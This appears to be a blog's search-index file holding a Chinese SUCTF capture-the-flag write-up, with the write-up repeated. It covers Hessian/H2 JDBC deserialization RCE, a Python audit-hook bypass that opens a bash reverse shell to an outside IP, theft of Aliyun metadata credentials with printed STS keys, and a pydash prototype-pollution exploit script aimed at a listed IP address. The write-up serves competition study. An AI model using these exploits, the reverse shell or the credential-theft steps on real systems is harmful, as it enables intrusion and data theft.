\u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: 